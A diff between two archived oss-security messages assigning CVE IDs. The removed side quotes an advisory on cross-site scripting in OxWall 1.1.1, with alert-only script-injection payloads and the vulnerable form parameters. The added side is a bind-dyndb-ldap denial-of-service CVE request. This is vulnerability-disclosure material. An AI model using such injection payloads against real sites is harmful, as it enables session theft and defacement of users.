@@ -1,130 +1,78 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/02/20/10
-Message-ID: <4F42D1C2.6030704@redhat.com>
-Date: Mon, 20 Feb 2012 16:05:38 -0700
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/04/24/15
+Message-ID: <4F96EC11.4040603@redhat.com>
+Date: Tue, 24 Apr 2012 12:08:17 -0600
 From: Kurt Seifried <kseifried@...hat.com>
 To: oss-security@...ts.openwall.com
-CC: YGN Ethical Hacker Group <lists@...g.net>, full-disclosure <full-disclosure@...ts.grok.org.uk>, bugtraq <bugtraq@...urityfocus.com>, secalert@...urityreason.com, bugs@...uritytracker.com, vuln <vuln@...unia.com>, vuln@...urity.nnov.ru, news@...uriteam.com, moderators@...db.org, submissions@...ketstormsecurity.org, submit@...ecurity.com, submit@...3ct0r.com
-Subject: Re: OxWall 1.1.1 <= Multiple Cross Site Scripting Vulnerabilities
+CC: Jan Lieskovsky <jlieskov@...hat.com>, "Steven M. Christey" <coley@...us.mitre.org>, Adam Tkac <atkac@...hat.com>, Petr Spacek <pspacek@...hat.com>
+Subject: Re: CVE Request -- bind-dyndb-ldap: Bind DoS (named hang) by processing DNS query for zone served by bind-dyndb-ldap
 Content-Type: text/plain; charset=utf-8
 
 -----BEGIN PGP SIGNED MESSAGE-----
 Hash: SHA1
 
-On 02/20/2012 09:53 AM, YGN Ethical Hacker Group wrote:
-> 1. OVERVIEW
+On 04/24/2012 10:47 AM, Jan Lieskovsky wrote:
+> Note: First time mangled email address of Petr Spacek => apologize
+> if you got this email two times. Anyway:
 > 
-> OxWall 1.1.1 and lower versions are vulnerable to Cross Site Scripting.
+> Hello Kurt, Steve, vendors,
 > 
+> a denial of service flaw was found in the way the bind-dyndb-ldap,
+> a dynamic LDAP back-end plug-in for BIND providing LDAP database
+> back-end capabilities, performed LDAP connection errors handling /
+> attempted to recover, when an error during a LDAP search happened
+> for a particular DNS query. When the Berkeley Internet Name Domain
+> (BIND) server was patched to support dynamic loading of database
+> back-ends, and the LDAP database back-end was enabled, a remote 
+> attacker could use this flaw to cause denial of service (named
+> process hang) via DNS query for zone served by bind-dyndb-ldap.
 > 
-> 2. BACKGROUND
-> 
-> Oxwall is a free open source software package for building social
-> networks, family sites and collaboration systems. It is a flexible
-> community website engine developed with the aim to provide people with
-> a well-coded, user-friendly software platform for social needs. It is
-> easy to set up, configure and manage Oxwall while you focus on your
-> site idea. We are testing the concept of free open source community
-> software for complete (site,sub-site setups) and partial
-> (widgets,features) community and collaboration solutions for companies
-> and individuals.
-> 
-> 
-> 3. VULNERABILITY DESCRIPTION
-> 
-> Multiple parameters were not properly sanitized, which allows attacker
-> to conduct Cross Site Scripting attack. This may allow an attacker to
-> create a specially crafted URL that would execute arbitrary script
-> code in a victim's browser.
+> bind-dyndb-ldap backend upstream commit, which introduced the
+> problem: [1] 
+> http://git.fedorahosted.org/git/?p=bind-dyndb-ldap.git;a=commit;h=a7a47212beb01c5083768bdd4170250e7f7cf188
+>
 > 
 > 
-> 4. VERSIONS AFFECTED
+> Preliminary bind-dyndb-ldap back-end upstream patch from Adam
+> Tkac: [2] https://bugzilla.redhat.com/show_bug.cgi?id=815846#c1
 > 
-> 1.1.1 and lower
+> References: [3] https://bugzilla.redhat.com/show_bug.cgi?id=815846 
+> [4]
+> https://www.redhat.com/archives/freeipa-users/2012-April/msg00145.html
+>
+>  Note: Just to explicitly note this. This is NOT a bind DoS in the
+> sense upstream bind source package would be affected by it. Bind 
+> needs to be first patched to support dynamic loading of database 
+> backends and it's an error in the LDAP backend (bind-dyndb-ldap 
+> source code) which makes this attack to succeed when a 
+> specially-crafted DNS query is issued.
 > 
+> Could you allocate a CVE id for this?
 > 
-> 5. PROOF-OF-CONCEPT/EXPLOIT
-> 
-> URL: http://localhost/Oxwall/join
-> 
-> Injected Attack String: '"><script>alert(/XSS/)</script>
-> Method: HTTP POST
-> Vulnerable Parameters: captchaField, email, form_name  ,password
-> ,realname  ,repeatPassword ,username
-> 
-> ------------------------------------------------------------------------------------
-> 
-> URL: http://localhost/Oxwall/contact
-> 
-> Injected Attack String: '"><script>alert(/XSS/)</script>
-> Method: HTTP POST
-> Vulnerable Parameters: captcha, email, form_name  ,from , subject
-> ------------------------------------------------------------------------------------
-> 
-> URL: http://localhost/Oxwall/blogs/browse-by-tag?tag=%27%22%3E%3Cscript%3Ealert%28/XSS/%29%3C/script%3E
-> Vulnerable Parameter: tag
-> 
-> ----------------------------------------------------------------------------
-> 
-> Vulnerable Parameter: RAW-URI
-> 
-> http://localhost/Oxwall/photo/viewlist/tagged/><img src=xs onerror=alert('XSS')>
-> 
-> http://localhost/Oxwall/photo/viewlist/%22style%3d%22position:fixed;width:1000px;height:1000px;display:block;left:0;top:0%22onmouseover=alert%28%27XSS%27%29;%22x=
-> 
-> http://localhost/Oxwall/video/viewlist/%22style%3d%22position:fixed;width:1000px;height:1000px;display:block;left:0;top:0%22onmouseover=alert%28%27XSS%27%29;%22x=
-> 
-> 
-> 6. SOLUTION
-> 
-> Upgade to the latest version of Oxwall.
-> 
-> 
-> 7. VENDOR
-> 
-> Oxwall Foundation
-> http://www.oxwall.org/
-> 
-> 
-> 8. CREDIT
-> 
-> Aung Khant, http://yehg.net, YGN Ethical Hacker Group, Myanmar.
-> 
-> 
-> 9. DISCLOSURE TIME-LINE
-> 
-> 2011-06-09: notified vendor
-> 2012-02-20: vulnerability disclosed
-> 
-> 
-> 10. REFERENCES
-> 
-> Original Advisory URL:
-> http://yehg.net/lab/pr0js/advisories/%5BOxWall_1.1.1%5D_xss
-> Oxwall Home Page: http://www.oxwall.org/
-> 
-> 
-> #yehg [2012-02-20]
+> Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat
+> Security Response Team
 
-Please use CVE-2012-0872 for these XSS issues.
+Please use CVE-2012-2134 for this issue.
 
 - -- 
 Kurt Seifried Red Hat Security Response Team (SRT)
+PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+
 -----BEGIN PGP SIGNATURE-----
 Version: GnuPG v1.4.12 (GNU/Linux)
 Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
 
-iQIcBAEBAgAGBQJPQtHCAAoJEBYNRVNeJnmTiKoP/A9I5fFvOOi9SFbkHWQPTWu/
-ID9i4VEPeH+YyGITSjx2J0nC4IaSr30DMemc4XjQqpRUz15KjmQYXapS+hDJXa7f
-9XpzUERrQPaghyIJG1X81pj2ONmS9euT31SNtH7iMt+4QD6K7ZOkOFFMSD0ViJS4
-+4CrCIyQ26wrmcaZ164JT6WeJNFzmZk1Fp6QMoyclMvQh0pzaN2I7fVb8lUQXI7C
-V9T3BIfpPVqoVrX69Ki5ojULLJL/EJhXKaAewUwfHsrX/KikFLq530/6x7+wjGXN
-+/GauH/IO4BB7XytY57sbILcfDwWKJycLbg8D+M/9QO+cp047HQD8AFHDAkTLjCL
-N2+9ckRyr3z4a5Ou9/Vfa6Fpg50RJ752ErDMOF2GQ4enkf7+LZuHmHmsVKEVUJWI
-TfxpaTyYLiUTnVPcazz8mqEXSuFw8gkdBGvjQpD3vTlVCNjfPZY3naqC2aWGOu2b
-VHnIbF/TDoi3oV/7Tu68pFcKeoopVEs3ENmdJagM4qINgs7xw3XtDJuICS1a8A70
-DJIsbHeASbbvtpEk0X69WzbC6QJuufhHImEAohfrhww8tZ+lqFkE0esaRBEGNGe2
-Hl4sXVCL9UgiGbXYO+VNohpnGAf+eWRL/fhLoBnU906sUkllXTDAfqBv6Ehey8u8
-dGs82XRcilij2gX4LabZ
-=Sh3G
+iQIcBAEBAgAGBQJPluwRAAoJEBYNRVNeJnmTiTwQAME5zGqXnfsu3bjqRmztFtpp
++tiCDANKzMDWPFtxDefPpKYAipwC7Iv1BjqkuOl3UmwYWONrU+jz/aivIJ3rNhDf
+YYWcOcu/93f37IF4fDbgWjW9jL0VDZtOlrtvdz+Cp0vmGiLtrXfcCu9kqvXf+aN8
+SyrY9ZrOWKSDsXXev3rD5JdiPoalGeSfK4ACnu8jzjxlmaDabgJx18ipKGiGKn6k
+AFbz8SSWIGDPWEeJEdtjR1r85Iaa3sorQzOXiznMXrADlvnx81Qbfi61w8lZfmLI
+itytRr+zjhUEzNOvnXQJTOxTgJfWAyQ8aVGzF/x+XQUdBvm5taJh27NGg/dQn+ZS
+m08kOpMV3wT5LwpqE4tWd1OA1og82Hhm9E+rkuyfPH849QsT6TwEWbUULNEa4dwM
+FjIGbBNBBRy7yifn8hvP2QfS1Kh85CXXtrukkXJ3OMHf4ffLkL1XsTJRrkohptcD
+WUALy3UMq3jHCyB9BksVyQxBVJ3HIKn2JOG+zYHLpJQLiSLeP9Ulvwy+mYe6aWK9
+67akrwu5znTJ8FZjsoYYYCaG9AcM+cGCvAZn9WkbDv+6JpcLMjPWgytbhsv3MtZk
+BqLWeEitlh2GsoKRUPQ9gHp4qFVZmIlKS7stUVDSHpGpz9hej0M17IU9r2e67njL
+nkhpU6Css4tEhsfepTV9
+=+AZO
 -----END PGP SIGNATURE-----
